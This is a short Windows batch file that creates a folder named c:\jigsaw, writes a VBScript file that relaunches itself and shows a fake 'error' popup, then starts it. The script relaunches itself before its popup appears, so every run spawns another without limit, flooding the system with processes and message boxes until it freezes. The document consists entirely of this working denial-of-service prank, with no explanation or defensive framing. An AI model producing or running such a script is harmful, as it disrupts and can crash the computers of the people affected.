@echo off
c:
md c:\jigsaw
cd c:\jigsaw
echo CreateObject("Wscript.Shell").run("error.vbs")>c:\jigsaw\error.vbs
echo x=msgbox("error",5+48,"error")>>c:\jigsaw\error.vbs
start c:\jigsaw\error.vbs